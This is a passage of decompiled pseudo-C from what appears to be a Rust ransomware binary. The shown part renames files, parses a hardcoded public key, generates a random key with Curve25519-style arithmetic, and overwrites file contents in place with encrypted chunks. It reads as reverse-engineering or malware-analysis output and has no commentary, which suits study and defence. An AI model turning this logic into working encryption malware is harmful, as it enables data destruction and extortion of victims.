*)&Src[0] + 1) = 2i64;\n      *(_QWORD *)&Src[2] = 0i64;\n      *(_QWORD *)&v190[16] = lpNewFileName;\n      *(_QWORD *)&v190[24] = sub_14002E510;\n      *(_QWORD *)&Src[1] = v190;\n      *((_QWORD *)&Src[1] + 1) = 2i64;\n      sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 138);\n      if ( !_InterlockedDecrement64((volatile signed __int64 *)v28) )\n        sub_14004BA31((__int64)v28);\n      sub_14004D22F(*(void **)RandomBuffer, *(__int64 *)&RandomBuffer[8]);\n      v176 = v174;\n    }\n    sub_140012E68((__int64)v188, (__int64)&v179);\n    v175 = v176;\n    v163[0] = (__int64)\"powerranges\";\n    v163[1] = 11i64;\n    v29 = (char *)sub_14003A0A0((unsigned __int8 *)v188[0], v189);\n    if ( v29 )\n      v31 = sub_14004AB00(v29, v30);\n    else\n      v31 = 0i64;\n    v32 = (void **)v31;\n    if ( !v31 )\n    {\n      v32 = &off_14006CC28;\n      v30 = 0i64;\n    }\n    v162[0] = (__int64)v32;\n    v162[1] = v30;\n    sub_140037120((__int64)Src, (char *)v188[0], v189);\n    if ( LODWORD(Src[0]) == 2 )\n    {\n      *(_QWORD *)&RandomBuffer[8] = *((_QWORD *)&Src[0] + 1);\n      *(_QWORD *)RandomBuffer = 2i64;\nLABEL_34:\n      sub_1400010EC((__int64 *)&RandomBuffer[8]);\n      v33 = 0i64;\n      goto LABEL_295;\n    }\n    qmemcpy(RandomBuffer, Src, 0x48ui64);\n    if ( *(_QWORD *)RandomBuffer == 2i64 )\n      goto LABEL_34;\n    sub_14003A220((__int64)v190, v188[0], v189, &off_14006CC28, 0i64);\n    v34 = *(void **)v190;\n    v35 = *(_QWORD *)&v190[16];\n    *(_QWORD *)RandomBuffer = v162;\n    *(_QWORD *)&RandomBuffer[8] = sub_140022230;\n    *(_QWORD *)&Src[0] = &off_140065938;\n    *((_QWORD *)&Src[0] + 1) = 2i64;\n    *(_QWORD *)&Src[2] = 0i64;\n    *(_QWORD *)&RandomBuffer[16] = v163;\n    *(_QWORD *)&RandomBuffer[24] = sub_140022230;\n    *(_QWORD *)&Src[1] = RandomBuffer;\n    *((_QWORD *)&Src[1] + 1) = 2i64;\n    sub_140006C00((__int64 *)lpNewFileName, (__int64 *)Src);\n    v36 = (WCHAR *)lpNewFileName[0];\n    sub_14003A220((__int64)Src, v34, v35, lpNewFileName[0], (size_t)lpNewFileName[2]);\n    sub_14004D22F(v36, (__int64)lpNewFileName[1]);\n    sub_14004D22F(v34, *(__int64 *)&v190[8]);\n    v37 = *(void **)&Src[0];\n    sub_14003A120((__int64)v158, v188[0], v189, *(unsigned __int8 **)&Src[0], *(unsigned __int64 *)&Src[1]);\n    sub_14004D22F(v37, *((__int64 *)&Src[0] + 1));\n    sub_140012E68((__int64)RandomBuffer, (__int64)v188);\n    sub_140012E68((__int64)Src, (__int64)v158);\n    v38 = *(void **)RandomBuffer;\n    v199 = *(WCHAR **)&Src[0];\n    v39 = *(_QWORD *)&Src[1];\n    sub_14002DD80((__int64)v190, *(char **)RandomBuffer, *(__int64 *)&RandomBuffer[16]);\n    v33 = *(WCHAR **)&v190[8];\n    if ( *(_QWORD *)v190 )\n    {\n      sub_140035060((__int64)lpNewFileName, (const WCHAR **)v190, 1);\n      v40 = (WCHAR *)lpNewFileName[0];\n      if ( lpNewFileName[0] )\n      {\n        v178[0] = *(_OWORD *)lpNewFileName;\n        v41 = lpNewFileName[1];\n        *(LPCWSTR *)&v178[1] = lpNewFileName[2];\n        sub_14002DD80((__int64)v190, (char *)v199, v39);\n        if ( !*(_QWORD *)v190 )\n        {\n          hFile = *(HANDLE *)&v190[8];\nLABEL_48:\n          if ( v41 )\n            sub_140006340(v40, 2ui64);\n          v33 = (WCHAR *)hFile;\n          goto LABEL_51;\n        }\n        sub_140035060((__int64)lpNewFileName, (const WCHAR **)v190, 1);\n        v42 = (WCHAR *)lpNewFileName[0];\n        hFile = (HANDLE)lpNewFileName[1];\n        if ( !lpNewFileName[0] )\n          goto LABEL_48;\n        if ( !MoveFileExW(v40, lpNewFileName[0], 1u) )\n        {\n          LODWORD(v89) = GetLastError();\n          v90 = (void *)((v89 << 32) | 2);\n          if ( hFile )\n          {\n            v91 = v42;\n            v92 = v90;\n            sub_140006340(v91, 2ui64);\n            hFile = v92;\n          }\n          else\n          {\n            hFile = v90;\n          }\n          goto LABEL_48;\n        }\n        if ( hFile )\n          sub_140006340(v42, 2ui64);\n        if ( v41 )\n          sub_140006340(v40, 2ui64);\n        v33 = 0i64;\n      }\n      else\n      {\n        v33 = (WCHAR *)lpNewFileName[1];\n      }\n    }\nLABEL_51:\n    sub_14004D22F(v199, *((__int64 *)&Src[0] + 1));\n    sub_14004D22F(v38, *(__int64 *)&RandomBuffer[8]);\n    if ( v33 )\n      goto LABEL_294;\n    *(_DWORD *)((char *)&Src[2] + 2) = 0;\n    LODWORD(Src[0]) = 0;\n    *(__int128 *)((char *)Src + 8) = 0i64;\n    *((_QWORD *)&Src[1] + 1) = 7i64;\n    LOWORD(Src[2]) = 257;\n    sub_140012E68((__int64)RandomBuffer, (__int64)v158);\n    v43 = *(void **)RandomBuffer;\n    v44 = sub_140034740(*(char **)RandomBuffer, *(__int64 *)&RandomBuffer[16], (__int64)Src);\n    v33 = v45;\n    if ( v44 )\n    {\n      sub_14004D22F(v43, *(__int64 *)&RandomBuffer[8]);\n      goto LABEL_294;\n    }\n    sub_14004D22F(v43, *(__int64 *)&RandomBuffer[8]);\n    sub_140034950((__int64)Src, v33);\n    if ( LODWORD(Src[0]) == 2 )\n    {\n      v46 = (LPCWSTR)*((_QWORD *)&Src[0] + 1);\n      goto LABEL_293;\n    }\n    v196 = *((_QWORD *)&Src[3] + 1);\n    if ( (unsigned __int64)qword_140084AE8 > 4 )\n    {\n      sub_140012E68((__int64)RandomBuffer, (__int64)v188);\n      *(_QWORD *)v190 = RandomBuffer;\n      *(_QWORD *)&v190[8] = sub_140032A70;\n      *(_QWORD *)&Src[0] = &off_140065980;\n      *((_QWORD *)&Src[0] + 1) = 2i64;\n      *(_QWORD *)&Src[2] = 0i64;\n      *(_QWORD *)&v190[16] = &v196;\n      *(_QWORD *)&v190[24] = sub_14001842B;\n      *(_QWORD *)&Src[1] = v190;\n      *((_QWORD *)&Src[1] + 1) = 2i64;\n      sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 44);\n      sub_14004D22F(*(void **)RandomBuffer, *(__int64 *)&RandomBuffer[8]);\n    }\n    v47 = sub_14004B4A9(64i64, 0);\n    v49 = v48;\n    qmemcpy(v47, \"cb018e44ba3c1a118e170c555462d26533dc15e1344f6f66e2178f92fd59cb3d\", 64);\n    memset(Src, 0, 32);\n    *(_QWORD *)v190 = v47;\n    *(_QWORD *)&v190[8] = v47 + 64;\n    *(_DWORD *)&v190[16] = 1114113;\n    for ( i = 0i64; i != 32; ++i )\n    {\n      v51 = sub_14004E79F((unsigned __int8 **)v190);\n      if ( v51 == 1114112\n        || !sub_14004E833(v51)\n        || (v53 = v52, v54 = sub_14004E79F((unsigned __int8 **)v190), v54 == 1114112)\n        || !sub_14004E833(v54) )\n      {\n        sub_14004D22F(v47, v49);\n        sub_14005D1D0(\n          (__int64)\"Wrong secret key format. A hex string of 64 chars is expected\",\n          61i64,\n          (__int64)&off_140065A60);\n      }\n      *((_BYTE *)Src + i) = (16 * v53) | v55;\n    }\n    *(_OWORD *)&RandomBuffer[16] = Src[1];\n    *(_OWORD *)RandomBuffer = Src[0];\n    sub_14004D22F(v47, v49);\n    v165 = *(_OWORD *)&RandomBuffer[16];\n    v164 = *(_OWORD *)RandomBuffer;\n    memset(RandomBuffer, 0, 32);\n    v56 = RandomBuffer;\n    v57 = 32i64;\n    while ( v57 )\n    {\n      v58 = 0xFFFFFFFFi64;\n      if ( v57 < 0xFFFFFFFF )\n        v58 = v57;\n      v57 -= v58;\n      v59 = &v56[v58];\n      v60 = SystemFunction036(v56, v58);\n      v56 = v59;\n      if ( !v60 )\n      {\n        v141 = (WCHAR *)sub_1400062B0(4ui64, 4ui64);\n        if ( !v141 )\n          sub_14005CBB0(4i64, 4i64);\n        *(_DWORD *)v141 = -2147483644;\n        lpNewFileName[0] = v141;\n        lpNewFileName[1] = (LPCWSTR)&off_1400670E8;\n        *(_QWORD *)v190 = lpNewFileName;\n        *(_QWORD *)&Src[0] = &off_140067148;\n        *((_QWORD *)&Src[0] + 1) = 1i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)&v190[8] = sub_14001A66F;\n        *(_QWORD *)&Src[1] = v190;\n        *((_QWORD *)&Src[1] + 1) = 1i64;\n        sub_14005CD00((__int64)Src, (__int64)&off_1400671B8);\n      }\n    }\n    *(_OWORD *)((char *)&v161.m256i_u64[1] + 7) = *(_OWORD *)&RandomBuffer[15];\n    *(_OWORD *)&v161.m256i_i8[1] = *(_OWORD *)&RandomBuffer[1];\n    v161.m256i_i8[0] = RandomBuffer[0] & 0xF8;\n    v161.m256i_i8[31] = RandomBuffer[31] & 0x3F | 0x40;\n    memset(v178, 0, sizeof(v178));\n    for ( j = 0i64; j != 32; ++j )\n    {\n      *((_BYTE *)v178 + 2 * j) = *(_BYTE *)sub_14000E2F0((__int64)&v161, j, (__int64)&off_140064260) & 0xF;\n      *((_BYTE *)v178 + 2 * j + 1) = *(_BYTE *)sub_14000E2F0((__int64)&v161, j, (__int64)&off_140064278) >> 4;\n    }\n    for ( k = 1i64; k != 64; ++k )\n    {\n      v63 = *((_BYTE *)&v177 + k + 7);\n      *((_BYTE *)&v177 + k + 7) = v63 - ((v63 + 8) & 0xF0);\n      *((_BYTE *)v178 + k) += (char)(v63 + 8) >> 4;\n    }\n    memset(v190, 0, 40);\n    *(_QWORD *)&v190[40] = 1i64;\n    memset(&v190[48], 0, 32);\n    *(_QWORD *)&v191[0] = 1i64;\n    memset((char *)v191 + 8, 0, 72);\n    for ( m = 0i64; m <= 0x3F; ++m )\n    {\n      if ( (m & 1) != 0 )\n      {\n        sub_14000E14E((__int64)RandomBuffer, &qword_14006CFF0[120 * (m >> 1)], *((_BYTE *)v178 + m));\n        sub_14000D3E4(Src, (__int64)v190, (unsigned __int64 *)RandomBuffer);\n        sub_14000E359(v190, (unsigned __int64 *)Src);\n      }\n    }\n    lpNewFileName[9] = *(LPCWSTR *)&v190[72];\n    *(_OWORD *)&lpNewFileName[7] = *(_OWORD *)&v190[56];\n    *(_OWORD *)&lpNewFileName[5] = *(_OWORD *)&v190[40];\n    lpNewFileName[14] = *(LPCWSTR *)&v191[2];\n    *(_OWORD *)&lpNewFileName[12] = v191[1];\n    *(_OWORD *)&lpNewFileName[10] = v191[0];\n    lpNewFileName[4] = *(LPCWSTR *)&v190[32];\n    *(_OWORD *)&lpNewFileName[2] = *(_OWORD *)&v190[16];\n    *(_OWORD *)lpNewFileName = *(_OWORD *)v190;\n    v65 = 3;\n    while ( 1 )\n    {\n      v66 = v65-- == 0;\n      if ( v66 )\n        break;\n      sub_14000E3B9((__int64)RandomBuffer, (__int64 *)lpNewFileName);\n      sub_14000D709(Src, (unsigned __int64 *)RandomBuffer, v195);\n      sub_14000D709((_QWORD *)&Src[2] + 1, (unsigned __int64 *)&RandomBuffer[40], v194);\n      sub_14000D709(&Src[5], v194, v195);\n      qmemcpy(lpNewFileName, Src, sizeof(lpNewFileName));\n    }\n    sub_14000E3B9((__int64)Src, (__int64 *)lpNewFileName);\n    sub_14000E359(v190, (unsigned __int64 *)Src);\n    v67 = 0i64;\nLABEL_86:\n    v68 = 0i64;\n    if ( v67 <= 0x40 )\n      v68 = 64 - v67;\n    v69 = v67 & 1;\n    v70 = v67 - 1;\n    while ( v68 > v69 )\n    {\n      v71 = v70++ + 2;\n      if ( (v71 & 1) != 0 )\n      {\n        sub_14000E14E((__int64)RandomBuffer, &qword_14006CFF0[120 * (v70 >> 1)], *((_BYTE *)v178 + v70));\n        sub_14000D3E4(Src, (__int64)v190, (unsigned __int64 *)RandomBuffer);\n        sub_14000E359(v190, (unsigned __int64 *)Src);\n        v67 = v70 + 1;\n        goto LABEL_86;\n      }\n    }\n    sub_14000DFC4((__int64)v178, v191, (__int64)&v190[40]);\n    sub_14000DFF0(lpNewFileName, v191, &v190[40]);\n    sub_14000DACE(Src, (__int64 *)lpNewFileName);\n    sub_14000D709(RandomBuffer, (unsigned __int64 *)v178, (unsigned __int64 *)Src);\n    sub_14000D4DA((__int64)v154, RandomBuffer);\n    v156 = v161;\n    v155 = v161;\n    v199 = (WCHAR *)(sub_14000E116((__int64)&v164) & 0x7FFFFFFFFFFFFi64);\n    v72 = ((unsigned __int64)sub_14000E116((__int64)&v164 + 6) >> 3) & 0x7FFFFFFFFFFFFi64;\n    v73 = ((unsigned __int64)sub_14000E116((__int64)&v164 + 12) >> 6) & 0x7FFFFFFFFFFFFi64;\n    v74 = ((unsigned __int64)sub_14000E116((__int64)&v165 + 3) >> 1) & 0x7FFFFFFFFFFFFi64;\n    v75 = sub_14000E116((__int64)&v165 + 8);\n    v171[0] = (unsigned __int64)v199;\n    v171[1] = v72;\n    v171[2] = v73;\n    v171[3] = v74;\n    v172 = (v75 >> 12) & 0x7FFFFFFFFFFFFi64;\n    *(_QWORD *)v190 = 1i64;\n    memset(&v190[8], 0, 72);\n    *(_QWORD *)&RandomBuffer[32] = v172;\n    *(_QWORD *)&RandomBuffer[16] = v73;\n    *(_QWORD *)&RandomBuffer[24] = v74;\n    *(_QWORD *)RandomBuffer = v199;\n    *(_QWORD *)&RandomBuffer[8] = v72;\n    *(_QWORD *)&RandomBuffer[40] = 1i64;\n    memset(&RandomBuffer[48], 0, 32);\n    memset(Src, 0, sizeof(Src));\n    for ( n = 0i64; n != 256; ++n )\n    {\n      v77 = v155.m256i_u8[n >> 3];\n      *((_BYTE *)Src + n) = _bittest(&v77, n & 7);\n    }\n    hFile = v33;\n    v78 = 255i64;\n    for ( ii = 255i64; ; v78 = ii )\n    {\n      v66 = ii-- == 0;\n      if ( v66 )\n        break;\n      v80 = sub_14004AF54(*((_BYTE *)Src + v78) ^ *((_BYTE *)&v186 + v78 + 7));\n      sub_14000E4D6(v190, RandomBuffer, v80);\n      sub_14000DFC4((__int64)v150, (__int128 *)v190, (__int64)&v190[40]);\n      sub_14000DFF0(v149, v190, &v190[40]);\n      sub_14000DFC4((__int64)v153, (__int128 *)RandomBuffer, (__int64)&RandomBuffer[40]);\n      sub_14000DFF0(v148, RandomBuffer, &RandomBuffer[40]);\n      sub_14000DF4B((__int64 *)v152, (__int64 *)v150);\n      sub_14000DF4B((__int64 *)v147, (__int64 *)v149);\n      sub_14000DFF0(v151, v152, v147);\n      sub_14000D709(v146, v150, v148);\n      sub_14000D709(v145, v149, v153);\n      sub_14000DFC4((__int64)v144, v146, (__int64)v145);\n      sub_14000DFF0(v157, v146, v145);\n      sub_14000DF4B((__int64 *)RandomBuffer, v144);\n      sub_14000DF4B((__int64 *)&v166, (__int64 *)v157);\n      sub_14000D709(v178, qword_140064290, v151);\n      sub_14000D709(v190, v152, v147);\n      sub_14000DFC4((__int64)lpNewFileName, v178, (__int64)v147);\n      sub_14000D709(&v190[40], v151, (unsigned __int64 *)lpNewFileName);\n      sub_14000D709(&RandomBuffer[40], v171, (unsigned __int64 *)&v166);\n    }\n    v81 = sub_14004AF54(Src[0]);\n    sub_14000E4D6(v190, RandomBuffer, v81);\n    sub_14000DACE(lpNewFileName, (__int64 *)&v190[40]);\n    sub_14000D709(v178, (unsigned __int64 *)v190, (unsigned __int64 *)lpNewFileName);\n    sub_14000D4DA((__int64)v159, v178);\n    sub_14000E13C((__int64)&v156);\n    v82 = sub_14004B4A9(15i64, 0);\n    v84 = v83;\n    v85 = *(_QWORD *)&v159[7];\n    *(_QWORD *)v82 = *(_QWORD *)v159;\n    *(_QWORD *)v183 = v82;\n    *(_QWORD *)(v82 + 7) = v85;\n    v184 = (__int64)sub_14004B4A9(16i64, 0);\n    *(_OWORD *)v184 = v160;\n    v169 = v84;\n    v170 = v86;\n    if ( v196 > 0x9600000 )\n    {\n      v33 = (WCHAR *)hFile;\n      if ( (unsigned __int64)qword_140084AE8 >= 5 )\n      {\n        sub_140012E68((__int64)RandomBuffer, (__int64)v188);\n        *(_QWORD *)&Src[0] = &off_140065A90;\n        *((_QWORD *)&Src[0] + 1) = 2i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)v190 = RandomBuffer;\n        *(_QWORD *)&v190[8] = sub_140032A70;\n        *(_QWORD *)&Src[1] = v190;\n        *((_QWORD *)&Src[1] + 1) = 1i64;\n        sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 61);\n        sub_14004D22F(*(void **)RandomBuffer, *(__int64 *)&RandomBuffer[8]);\n      }\n      v199 = (WCHAR *)sub_14004B4A9(104857600i64, 1);\n      lpNewFileName[0] = v199;\n      lpNewFileName[1] = v87;\n      lpNewFileName[2] = (LPCWSTR)104857600;\n      if ( (unsigned __int64)qword_140084AE8 >= 4 )\n      {\n        *(_QWORD *)&Src[0] = &off_14006CC28;\n        *((_QWORD *)&Src[0] + 1) = 1i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)RandomBuffer = &v175;\n        *(_QWORD *)&RandomBuffer[8] = sub_14001842B;\n        *(_QWORD *)&Src[1] = RandomBuffer;\n        *((_QWORD *)&Src[1] + 1) = 1i64;\n        sub_14000E7FB((__int64)Src, 4i64, (__int128 *)&off_1400659B0, 65);\n      }\n      if ( (v175 & 0x8000000000000000ui64) != 0i64 )\n        v88 = (float)(int)((v175 >> 1) | v175 & 1) + (float)(int)((v175 >> 1) | v175 & 1);\n      else\n        v88 = (float)(int)v175;\n      v94 = 104857600.0 / (float)(v88 * 0.0099999998);\n      if ( (unsigned __int64)qword_140084AE8 <= 3 )\n      {\n        v103 = 0i64;\n        if ( v94 >= 0.0 )\n          v103 = (unsigned int)(int)v94;\n        if ( v94 > 1.8446743e19 )\n          v103 = -1i64;\n        v96 = v103;\n      }\n      else\n      {\n        v95 = 0i64;\n        if ( v94 >= 0.0 )\n          v95 = (unsigned int)(int)v94;\n        if ( v94 > 1.8446743e19 )\n          v95 = -1i64;\n        *(_QWORD *)v190 = v95;\n        *(_QWORD *)&Src[0] = &off_140065AC0;\n        *((_QWORD *)&Src[0] + 1) = 1i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)RandomBuffer = v190;\n        *(_QWORD *)&RandomBuffer[8] = sub_14001842B;\n        *(_QWORD *)&Src[1] = RandomBuffer;\n        *((_QWORD *)&Src[1] + 1) = 1i64;\n        sub_14000E7FB((__int64)Src, 4i64, (__int128 *)&off_1400659B0, 68);\n        v96 = v95;\n      }\n      if ( !v96 )\n        sub_14005CEC0(\n          (__int64)\"assertion failed: step != 0/rustc/c4190f2d3a46a59f435f7b42f58bc22b2f4d6917\\\\library\\\\core\\\\src\\\\iter\\\\\"\n                   \"adapters\\\\step_by.rs\",\n          27i64,\n          (__int64)&off_140067048);\n      v197 = v196;\n      *(_QWORD *)v192 = v96;\n      v186 = v96 - 1;\n      v104 = 104857600i64;\n      v105.QuadPart = 0i64;\n      for ( jj = 0; ; jj = 1 )\n      {\n        if ( (jj & 1) != 0 )\n        {\n          v66 = __CFADD__(v186, v105.QuadPart);\n          v105.QuadPart += v186;\n          if ( v66 )\n            break;\n        }\n        if ( v105.QuadPart >= v197 )\n          break;\n        v157[0] = v105;\n        v107 = v105;\n        if ( (unsigned __int64)qword_140084AE8 > 4 )\n        {\n          sub_140012E68((__int64)v190, (__int64)v188);\n          *(_QWORD *)&Src[0] = v190;\n          v33 = (WCHAR *)hFile;\n          *((_QWORD *)&Src[0] + 1) = sub_140032A70;\n          *(_QWORD *)&Src[1] = v157;\n          *((_QWORD *)&Src[1] + 1) = sub_14001842B;\n          *(_QWORD *)RandomBuffer = &off_140065AE8;\n          *(_QWORD *)&RandomBuffer[8] = 3i64;\n          *(_QWORD *)&RandomBuffer[32] = 0i64;\n          *(_QWORD *)&Src[2] = &v196;\n          *((_QWORD *)&Src[2] + 1) = sub_14001842B;\n          *(_QWORD *)&RandomBuffer[16] = Src;\n          *(_QWORD *)&RandomBuffer[24] = 3i64;\n          sub_14000E7FB((__int64)RandomBuffer, 5i64, (__int128 *)&off_1400659B0, 70);\n          sub_14004D22F(*(void **)v190, *(__int64 *)&v190[8]);\n          v107 = v157[0];\n        }\n        if ( v196 - v107.QuadPart < *(_QWORD *)v192 )\n          break;\n        sub_140035AA0((union _LARGE_INTEGER *)Src, v33, 0i64, v107);\n        sub_14001844A(\n          *(__int64 *)&Src[0],\n          *((__int64 *)&Src[0] + 1),\n          (__int64)\"Unable to seek to position\",\n          26i64,\n          (__int64)&off_140065B38);\n        if ( (unsigned __int64)qword_140084AE8 > 4 )\n        {\n          sub_140012E68((__int64)v190, (__int64)v188);\n          sub_1400198B0((union _LARGE_INTEGER *)v178, hFile);\n          *(_QWORD *)&Src[0] = v190;\n          v33 = (WCHAR *)hFile;\n          *((_QWORD *)&Src[0] + 1) = sub_140032A70;\n          *(_QWORD *)&Src[1] = v178;\n          *((_QWORD *)&Src[1] + 1) = sub_1400149AA;\n          *(_QWORD *)RandomBuffer = &off_140065B68;\n          *(_QWORD *)&RandomBuffer[8] = 3i64;\n          *(_QWORD *)&RandomBuffer[32] = 0i64;\n          *(_QWORD *)&Src[2] = &v196;\n          *((_QWORD *)&Src[2] + 1) = sub_14001842B;\n          *(_QWORD *)&RandomBuffer[16] = Src;\n          *(_QWORD *)&RandomBuffer[24] = 3i64;\n          sub_14000E7FB((__int64)RandomBuffer, 5i64, (__int128 *)&off_1400659B0, 75);\n          sub_140018484(v178);\n          sub_14004D22F(*(void **)v190, *(__int64 *)&v190[8]);\n        }\n        sub_140034CE0((__int64)Src, v33, v199, v104);\n        if ( *(_QWORD *)&Src[0] )\n        {\n          v46 = (LPCWSTR)*((_QWORD *)&Src[0] + 1);\n          v122 = lpNewFileName[1];\n          v123 = v199;\n          goto LABEL_291;\n        }\n        v108 = *((_QWORD *)&Src[0] + 1);\n        v166 = (WCHAR *)*((_QWORD *)&Src[0] + 1);\n        if ( !*((_QWORD *)&Src[0] + 1) )\n          break;\n        ++v105.QuadPart;\n        v109 = sub_140018494(*((unsigned __int64 *)&Src[0] + 1), (__int64)v199, v104, (__int64)&off_140065B98);\n        v111 = 0i64;\n        while ( v110 != v111 )\n        {\n          if ( *(_BYTE *)(v109 + v111++) != 0 )\n          {\n            v113 = sub_140018494(v108, (__int64)v199, v104, (__int64)&off_140065C28);\n            sub_140014AB0((__int64)Src, v113, v114, *(void **)v183, 0xFui64, (__int128 *)v184);\n            if ( *(_QWORD *)&Src[0] )\n            {\n              *(_QWORD *)&RandomBuffer[16] = *(_QWORD *)&Src[1];\n              *(_OWORD *)RandomBuffer = Src[0];\n            }\n            else\n            {\n              *(_QWORD *)RandomBuffer = 0i64;\n            }\n            sub_1400184B5((__int64)Src, RandomBuffer, (__int64)&off_140065C40);\n            sub_140035AA0((union _LARGE_INTEGER *)RandomBuffer, v33, 0i64, v157[0]);\n            sub_14001844A(\n              *(__int64 *)RandomBuffer,\n              *(__int64 *)&RandomBuffer[8],\n              (__int64)\"Unable to seek to position\",\n              26i64,\n              (__int64)&off_140065C58);\n            v117 = *(void **)&Src[0];\n            v118 = sub_1400198C0(v33, *(char **)&Src[0], *(unsigned __int64 *)&Src[1]);\n            sub_1400184E5((__int64)v118, (__int64)\"Unable to write data to file\", 28i64, (__int64)&off_140065C90);\n            lpNewFileName[2] = 0i64;\n            sub_14004E6E3((__int64 *)lpNewFileName, 0x6400000ui64);\n            v119 = lpNewFileName[2];\n            v199 = (WCHAR *)lpNewFileName[0];\n            v120 = (char *)lpNewFileName[2] + (unsigned __int64)lpNewFileName[0];\n            for ( kk = 0i64; kk != 104857599; ++kk )\n              v120[kk] = 0;\n            v120[104857599] = 0;\n            v104 = (unsigned __int64)(v119 + 52428800);\n            lpNewFileName[2] = (LPCWSTR)v104;\n            v115 = *((_QWORD *)&Src[0] + 1);\n            v116 = v117;\n            goto LABEL_156;\n          }\n        }\n        if ( (unsigned __int64)qword_140084AE8 <= 4 )\n          continue;\n        sub_140012E68((__int64)v190, (__int64)v188);\n        sub_1400198B0((union _LARGE_INTEGER *)v178, v33);\n        *(_QWORD *)&Src[0] = v190;\n        *((_QWORD *)&Src[0] + 1) = sub_140032A70;\n        *(_QWORD *)&Src[1] = v178;\n        *((_QWORD *)&Src[1] + 1) = sub_1400149AA;\n        *(_QWORD *)RandomBuffer = &off_140065BE8;\n        *(_QWORD *)&RandomBuffer[8] = 4i64;\n        *(_QWORD *)&RandomBuffer[32] = 0i64;\n        *(_QWORD *)&Src[2] = &v166;\n        *((_QWORD *)&Src[2] + 1) = sub_14001842B;\n        *(_QWORD *)&RandomBuffer[16] = Src;\n        *(_QWORD *)&RandomBuffer[24] = 3i64;\n        sub_14000E7FB((__int64)RandomBuffer, 5i64, (__int128 *)&off_1400659B0, 81);\n        sub_140018484(v178);\n        v115 = *(_QWORD *)&v190[8];\n        v116 = *(void **)v190;\nLABEL_156:\n        sub_14004D22F(v116, v115);\n      }\n      sub_14004D22F(v199, (__int64)lpNewFileName[1]);\n      goto LABEL_160;\n    }\n    v33 = (WCHAR *)hFile;\n    if ( (unsigned __int64)qword_140084AE8 > 4 )\n    {\n      sub_140012E68((__int64)RandomBuffer, (__int64)v188);\n      *(_QWORD *)&Src[0] = &off_140065CC0;\n      *((_QWORD *)&Src[0] + 1) = 2i64;\n      *(_QWORD *)&Src[2] = 0i64;\n      *(_QWORD *)v190 = RandomBuffer;\n      *(_QWORD *)&v190[8] = sub_140032A70;\n      *(_QWORD *)&Src[1] = v190;\n      *((_QWORD *)&Src[1] + 1) = 1i64;\n      sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 92);\n      sub_14004D22F(*(void **)RandomBuffer, *(__int64 *)&RandomBuffer[8]);\n    }\n    *(_QWORD *)v190 = 1i64;\n    *(_OWORD *)&v190[8] = 0i64;\n    sub_140034950((__int64)Src, v33);\n    if ( LODWORD(Src[0]) == 2 )\n    {\n      *(_QWORD *)&RandomBuffer[8] = *((_QWORD *)&Src[0] + 1);\n      *(_QWORD *)RandomBuffer = 1i64;\n      v93 = (__int64 *)&RandomBuffer[8];\nLABEL_172:\n      LODWORD(v99) = sub_14002B4A0(v93);\n      LOBYTE(v99) = 1;\n      LODWORD(v197) = v99;\n      v100 = 0i64;\n      *((_QWORD *)&v99 + 1) = 0i64;\n      goto LABEL_173;\n    }\n    v97 = *((_QWORD *)&Src[3] + 1);\n    *(_QWORD *)RandomBuffer = 0i64;\n    if ( !SetFilePointerEx(v33, 0i64, (PLARGE_INTEGER)RandomBuffer, 1u) )\n    {\n      LODWORD(v127) = GetLastError();\n      *((_QWORD *)&Src[0] + 1) = (v127 << 32) | 2;\n      *(_QWORD *)&Src[0] = 1i64;\n      v93 = (__int64 *)Src + 1;\n      goto LABEL_172;\n    }\n    v66 = v97 < *(_QWORD *)RandomBuffer;\n    v98 = v97 - *(_QWORD *)RandomBuffer;\n    LODWORD(v99) = 0;\n    if ( v66 )\n      v98 = 0i64;\n    *((_QWORD *)&v99 + 1) = 0i64;\n    v100 = 0i64;\n    if ( v98 )\n    {\n      *(_QWORD *)&v99 = sub_14005DD90((__int64 *)v190, 0i64, v98);\n      *((_QWORD *)&v99 + 1) = *(_QWORD *)&v190[8];\n      v100 = *(WCHAR **)&v190[16];\n    }\n    LOBYTE(v99) = 1;\n    LODWORD(v197) = v99;\n    v66 = __CFADD__(v98, 1024i64);\n    v101 = v98 + 1024;\n    if ( !v66 )\n    {\n      v102 = v101 & 0x1FFF;\n      if ( (v101 & 0x1FFF) != 0 )\n      {\n        v186 = 0x2000 - v102 + v101;\n        LOBYTE(v102) = __CFADD__(0x2000 - v102, v101);\n        LODWORD(v197) = v102;\n      }\n      else\n      {\n        v186 = v101;\n        LODWORD(v197) = 0;\n      }\n    }\nLABEL_173:\n    v177 = (WCHAR *)*((_QWORD *)&v99 + 1);\n    v128 = 0i64;\nLABEL_174:\n    v129 = v100;\n    while ( 1 )\n    {\n      if ( v129 == *((WCHAR **)&v99 + 1) )\n      {\n        sub_14005DD90((__int64 *)v190, *((__int64 *)&v99 + 1), 32i64);\n        *((_QWORD *)&v99 + 1) = *(_QWORD *)&v190[8];\n        v129 = *(WCHAR **)&v190[16];\n      }\n      *(_QWORD *)v192 = *(_QWORD *)v190;\n      v199 = (WCHAR *)*((_QWORD *)&v99 + 1);\n      v130 = *((_QWORD *)&v99 + 1) - (_QWORD)v129;\n      *((_QWORD *)&v99 + 1) = v186;\n      if ( v130 < v186 )\n        *((_QWORD *)&v99 + 1) = v130;\n      if ( (_BYTE)v197 )\n        *((_QWORD *)&v99 + 1) = v130;\n      *(_QWORD *)&v99 = (char *)v129 + *(_QWORD *)v190;\n      *(_OWORD *)RandomBuffer = v99;\n      *(_QWORD *)&RandomBuffer[16] = 0i64;\n      *(_QWORD *)&RandomBuffer[24] = v128;\n      v131 = sub_140034A60(v33, RandomBuffer);\n      if ( !v131 )\n      {\n        if ( !*(_QWORD *)&RandomBuffer[16] )\n          goto LABEL_308;\n        v128 = *(_QWORD *)&RandomBuffer[24] - *(_QWORD *)&RandomBuffer[16];\n        if ( *(_QWORD *)&RandomBuffer[24] < *(_QWORD *)&RandomBuffer[16] )\n          sub_14005D0B0(*(__int64 *)&RandomBuffer[16], *(__int64 *)&RandomBuffer[24], (__int64)&off_14006A108);\n        v133 = *(_QWORD *)&RandomBuffer[8];\n        if ( *(_QWORD *)&RandomBuffer[24] > 